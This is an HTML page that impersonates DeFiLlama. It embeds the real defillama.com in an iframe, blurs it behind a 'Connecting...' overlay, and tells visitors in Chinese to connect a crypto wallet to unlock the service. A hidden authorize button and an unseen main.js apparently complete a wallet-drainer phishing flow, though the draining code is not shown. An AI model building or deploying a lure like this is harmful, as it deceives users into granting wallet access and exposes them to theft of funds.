<!DOCTYPE html>
<html lang="zh-Hant">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DeFiLlama</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">

    <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>

    <link rel="stylesheet" href="./src/style.css">
</head>
<body>

    <header>
        <button id="connectButton" title="Connect wallet">
            <i class="fas fa-wallet"></i> Connect Wallet
        </button>
    </header>

    <div id="contentContainer">
        <iframe id="coindeskFrame" src="https://defillama.com/" title="DeFiLlama"></iframe>
    </div>

    <div id="blurOverlay">
        <div id="overlayMessage">Connecting...</div>
    </div>

    <div id="lockedPrompt">
        <div id="authGuideBox">
            <div id="arrowIndicator"></div> 
            
            <div class="info-box">
                <p style="margin: 0; font-size: 1.0em; color: #f0f0f0;">
                    <i class="fas fa-hand-pointer"></i> 請點擊右上角連線錢包以解鎖服務。
                </p>
            </div>
        </div>
        
        <h2 style="display: none;"></h2>
        <p style="display: none;"></p>
        <button id="authorizeButton" style="display: none;"></button>
        <p class="small-tip" style="display: none;"></p>
    </div>


    <script src="./src/main.js"></script>

</body>
</html>
